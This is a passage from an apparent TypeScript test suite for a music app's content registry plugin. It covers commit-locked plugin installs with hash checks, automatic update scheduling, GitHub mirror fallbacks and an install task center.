          capabilities: ['audio:dsp'],
        },
      },
      bytes: {
        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v1-sha/index.js': new TextEncoder().encode(
          'export default function safePlugin() { return "v1"; }',
        ),
        'https://raw.githubusercontent.com/good-author/safe-plugin/commit-v2-sha/index.js': new TextEncoder().encode(
          'export default function safePlugin() { return "v2"; }',
        ),
      },
    }

    const harness = await setupInitialized({ http: httpSpec })

    harness.plugin.setPluginInstaller(async (bundle) => {
      installedBundle = bundle
    })

    const entry = entryOf({
      id: 'safe-plugin',
      kind: 'plugin',
      name: 'Safe Plugin',
      repoUrl: 'https://github.com/good-author/safe-plugin',
      capabilities: ['audio:dsp'],
    })

    // 1. Initial install
    await harness.plugin.install(entry)
    expect(installedBundle).toBeDefined()
    expect(installedBundle.manifest.id).toBe('safe-plugin')

    const lock1 = await harness.plugin.getLockRecord('safe-plugin')
    expect(lock1).toBeDefined()
    expect(lock1?.commit).toBe('commit-v1-sha')
    expect(lock1?.kind).toBe('plugin')
    expect(lock1?.sha256).toBe(sha256Hex('export default function safePlugin() { return "v1"; }'))

    // 2. Fetch entry details surfaces commit
    const details = await harness.plugin.fetchEntryDetails(entry)
    expect(details.commit).toBe('commit-v1-sha')

    // 3. Update with new commit
    httpSpec.json['https://api.github.com/repos/good-author/safe-plugin/commits/HEAD'] = {
      sha: 'commit-v2-sha',
    }

    const detailsV2 = await harness.plugin.fetchEntryDetails(entry)
    expect(detailsV2.commitDiff).toEqual({
      previousCommit: 'commit-v1-sha',
      currentCommit: 'commit-v2-sha',
    })

    await harness.plugin.install(entry)
    const lock2 = await harness.plugin.getLockRecord('safe-plugin')
    expect(lock2?.commit).toBe('commit-v2-sha')
    expect(lock2?.sha256).toBe(sha256Hex('export default function safePlugin() { return "v2"; }'))
  })
})

/* ── the daily automatic check ───────────────────────────────────────────── */

describe('automatic checks', () => {
  it('schedules a check shortly after boot when enabled', async () => {
    const { ctx, data } = await setupInitialized({
      index: { entries: [] },
      registryAutoCheck: true,
      autoCheckDelayMs: 10,
      autoCheckIntervalMs: 3_600_000,
    })
    const seen: (readonly RegistryUpdate[])[] = []
    ctx.on('registry/updates-available', (updates) => seen.push(updates))

    await new Promise((resolve) => setTimeout(resolve, 50))
    expect(seen.length).toBeGreaterThanOrEqual(1)
    const prefs = data.get(PREFS_KEY) as { lastCheckAt?: number }
    expect(prefs.lastCheckAt).toBeGreaterThan(0)
  })

  it('does not schedule when the toggle is off, and follows it when it flips', async () => {
    const harness = await setupInitialized({
      index: { entries: [] },
      registryAutoCheck: false,
      autoCheckDelayMs: 10,
    })
    const internals = harness.plugin as unknown as { autoCheckCancel?: () => void }
    expect(internals.autoCheckCancel).toBeUndefined()

    harness.ctx.emit('settings/changed', { ...DEFAULT_APP_SETTINGS, registryAutoCheck: true })
    expect(typeof internals.autoCheckCancel).toBe('function')

    harness.ctx.emit('settings/changed', { ...DEFAULT_APP_SETTINGS, registryAutoCheck: false })
    expect(internals.autoCheckCancel).toBeUndefined()
  })
})

/* ── the github-fetch download layer (Group 6) ───────────────────────────── */

describe('github-fetch integration', () => {
  it('walks the acceleration prefix chain when the official Contents API fails', async () => {
    const prefix = 'https://ghproxy.example.com'
    const base = 'https://api.github.com/repos/BBeBeeX/B_Be_Bee-registry/contents'
    const harness = await setupInitialized({
      http: {
        status: {
          [`${base}/music-sources`]: 403,
          [`${base}/lyric-sources`]: 403,
          [`${base}/plugins`]: 403,
          [`${base}/themes`]: 403,
        },
        json: {
          [`${prefix}/${base}/music-sources`]: [
            { name: 'alice.json', type: 'file', download_url: 'https://cdn.example/music.json' },
          ],
          [`${prefix}/${base}/lyric-sources`]: [],
          [`${prefix}/${base}/plugins`]: [],
          [`${prefix}/${base}/themes`]: [],
          'https://cdn.example/music.json': {
            id: 'music-foo',
            kind: 'music-source',
            name: 'Foo Music',
            version: '1.0.0',
          },
        },
      },
    })
    harness.settings.getSync.mockReturnValue({
      ...DEFAULT_APP_SETTINGS,
      registryAutoCheck: false,
      githubAccelerationPrefixes: [prefix],
    })

    // Every directory answered through the prefix candidate; the author-hosted
    // download_url stayed a single official candidate.
    const index = await harness.plugin.getIndex()
    expect(index.entries.map((entry) => entry.id)).toEqual(['music-foo'])
  })

  it('serves the legacy registry.json fallback through jsDelivr when raw fails', async () => {
    const rawRegistryJson =
      'https://raw.githubusercontent.com/BBeBeeX/B_Be_Bee-registry/main/registry.json'
    const viaJsDelivr = 'https://cdn.jsdelivr.net/gh/BBeBeeX/B_Be_Bee-registry@main/registry.json'
    const harness = await setupInitialized({
      http: {
        status: { [rawRegistryJson]: 403 },
        json: {
          [viaJsDelivr]: { entries: [{ id: 'via-jsdelivr', kind: 'theme', name: 'Via jsDelivr' }] },
        },
      },
    })

    const index = await harness.plugin.getIndex()
    expect(index.entries.map((entry) => entry.id)).toEqual(['via-jsdelivr'])
  })

  it('uses a configured endpoint override verbatim even with prefixes configured', async () => {
    const mirror = 'https://mirror.example/registry.json'
    const harness = await setupInitialized({
      http: { json: { [mirror]: { entries: [{ id: 'from-mirror', kind: 'theme', name: 'Mirror' }] } } },
    })
    harness.settings.getSync.mockReturnValue({
      ...DEFAULT_APP_SETTINGS,
      registryAutoCheck: false,
      githubAccelerationPrefixes: ['https://ghproxy.example.com'],
    })
    harness.data.set(PREFS_KEY, { endpoint: mirror })

    const index = await harness.plugin.getIndex()
    expect(index.entries.map((entry) => entry.id)).toEqual(['from-mirror'])
  })
})

/* ── the task center (Group 3) ───────────────────────────────────────────── */

describe('registry task center', () => {
  const musicUrl = 'https://cdn.example/foo-task.json'
  const musicDocument = JSON.stringify({ sourceUrl: 'https://foo.example', sourceName: 'Task Music' })
  const musicEntry = () =>
    entryOf({
      id: 'music-task',
      kind: 'music-source',
      name: 'Task Music',
      downloadUrl: musicUrl,
      sourceUrl: 'https://foo.example',
    })

  it('walks the lifecycle: fetch creates the task, the install completes it', async () => {
    const harness = await setupInitialized({
      http: { json: { [musicUrl]: musicDocument } },
      sources: [makeSourceRecord('https://foo.example', '1.0.0')],
    })
    harness.sources.import.mockResolvedValueOnce({
      added: [makeSourceRecord('https://foo.example', '1.1.0')],
      updated: [],
      unchanged: [],
      rejected: [],
      conflicts: [],
    })

    const seen: (readonly RegistryTask[])[] = []
    harness.ctx.on('registry/tasks-changed', (tasks) => seen.push(tasks))

    // The fetch runs download → verify, then parks at pending ("等待确认").
    await harness.plugin.fetchEntryDetails(musicEntry())
    let tasks = harness.plugin.getTasks()
    expect(tasks).toHaveLength(1)
    expect(tasks[0]).toMatchObject({
      entryId: 'music-task',
      entryName: 'Task Music',
      kind: 'music-source',
      operation: 'install',
      status: 'pending',
      stage: 'verify',
    })
    expect(tasks[0]?.startedAt).toBeGreaterThan(0)
    expect(tasks[0]?.finishedAt).toBeUndefined()

    // The install resumes the same record and lands it as success.
    await harness.plugin.install(musicEntry())
    tasks = harness.plugin.getTasks()
    expect(tasks).toHaveLength(1)
    expect(tasks[0]).toMatchObject({ status: 'success', stage: 'install' })
    expect(tasks[0]?.finishedAt).toBeGreaterThan(0)
    expect(tasks[0]?.error).toBeUndefined()

    // Every mutation announced the FULL snapshot; the last one matches getTasks().
    expect(seen.length).toBeGreaterThanOrEqual(3)
    expect(seen[seen.length - 1]).toEqual(harness.plugin.getTasks())
  })

  it('reports the install stage while a domain import is in flight', async () => {
    const harness = await setupInitialized({
      http: { json: { [musicUrl]: musicDocument } },
      sources: [makeSourceRecord('https://foo.example', '1.0.0')],
    })
    let releaseImport: () => void = () => {}
    harness.sources.import.mockImplementationOnce(
      async () =>
        new Promise<ImportReport>((resolve) => {
          releaseImport = () =>
            resolve({
              added: [makeSourceRecord('https://foo.example', '1.1.0')],
              updated: [],
              unchanged: [],
              rejected: [],
              conflicts: [],
            })
        }),
    )

    const pendingInstall = harness.plugin.install(musicEntry())
    await vi.waitFor(() => expect(harness.plugin.getTasks()[0]?.stage).toBe('install'))
    expect(harness.plugin.getTasks()[0]).toMatchObject({ status: 'running' })

    releaseImport()
    await pendingInstall
    expect(harness.plugin.getTasks()[0]?.status).toBe('success')
  })

  it('fails the task when fetchEntryDetails throws, keeping the error text', async () => {
    const harness = await setupInitialized({
      http: { fail: { [musicUrl]: new Error('offline') } },
    })
    await expect(harness.plugin.fetchEntryDetails(musicEntry())).rejects.toThrow(/offline/)

    const tasks = harness.plugin.getTasks()
    expect(tasks).toHaveLength(1)
    expect(tasks[0]).toMatchObject({ entryId: 'music-task', status: 'failed', stage: 'download' })
    expect(tasks[0]?.error).toContain('offline')
    expect(tasks[0]?.finishedAt).toBeGreaterThan(0)
  })

  it('fails the task with the error text when the install throws', async () => {
    const failingUrl = 'https://cdn.example/bad-theme-task.json'
    const harness = await setupInitialized({
      http: { json: { [failingUrl]: makeFailingTheme('bad-theme-task') } },
    })

    await expect(
      harness.plugin.install(entryOf({ id: 'bad-theme-task', kind: 'theme', name: 'Bad', downloadUrl: failingUrl })),
    ).rejects.toThrow(/failed the contrast check/)

    const tasks = harness.plugin.getTasks()
    expect(tasks).toHaveLength(1)
    expect(tasks[0]).toMatchObject({ status: 'failed' })
    expect(tasks[0]?.error).toContain('failed the contrast check')
  })

  it('keeps a task pending when the dialog is abandoned, and reuses it on the next fetch', async () => {
    const harness = await setupInitialized({
      http: { json: { [musicUrl]: musicDocument } },
    })
    await harness.plugin.fetchEntryDetails(musicEntry())
    const first = harness.plugin.getTasks()[0]
    expect(first?.status).toBe('pending')

    // The user dismissed the confirm dialog. A later fetch of the same entry
    // resets the same record instead of piling up a duplicate.
    await harness.plugin.fetchEntryDetails(musicEntry())
    const tasks = harness.plugin.getTasks()
    expect(tasks).toHaveLength(1)
    expect(tasks[0]?.id).toBe(first?.id)
    expect(tasks[0]?.status).toBe('pending')
  })

  it('produces no task when the diagnostics rescan re-fetches an entry', async () => {
    const harness = await setupInitialized({
      http: { json: { [musicUrl]: musicDocument } },
      sources: [makeSourceRecord('https://foo.example')],
    })
    harness.data.set(INDEX_CACHE_KEY, { fetchedAt: 1, index: { entries: [musicEntry()] } })

    await harness.plugin.rescanEntry('music-task')
    expect(harness.plugin.getTasks()).toEqual([])
  })

  it('clears only finished tasks — a pending one survives', async () => {
    const harness = await setupInitialized({
      http: {
        json: { [musicUrl]: musicDocument },
        fail: { 'https://cdn.example/broken-task.json': new Error('offline') },
      },
    })
    await expect(
      harness.plugin.fetchEntryDetails(
        // A music source: its fetch actually downloads, so the failure is real.
        entryOf({
          id: 'broken-task',
          kind: 'music-source',
          name: 'Broken',
          downloadUrl: 'https://cdn.example/broken-task.json',
        }),
      ),
    ).rejects.toThrow(/offline/)
    await harness.plugin.fetchEntryDetails(musicEntry())

    expect(harness.plugin.getTasks()).toHaveLength(2)
    harness.plugin.clearFinishedTasks()

    const remaining = harness.plugin.getTasks()
    expect(remaining).toHaveLength(1)
    expect(remaining[0]).toMatchObject({ entryId: 'music-task', status: 'pending' })
  })
})

/* ── the plugin entry point ──────────────────────────────────────────────── */

describe('apply', () => {
  it('registers the registry service on ctx', async () => {
    const ctx = new Context()
    const { store } = makeStore()
    ctx.provide('store', store)
    ctx.provide('http', makeHttp({ json: { [DEFAULT_ENDPOINT]: { entries: [] } } }))

    const dispose = await apply(ctx)
    expect(ctx.reflect.get('contentRegistry', false)).toBeInstanceOf(RegistryPlugin)
    await dispose()
  })
})
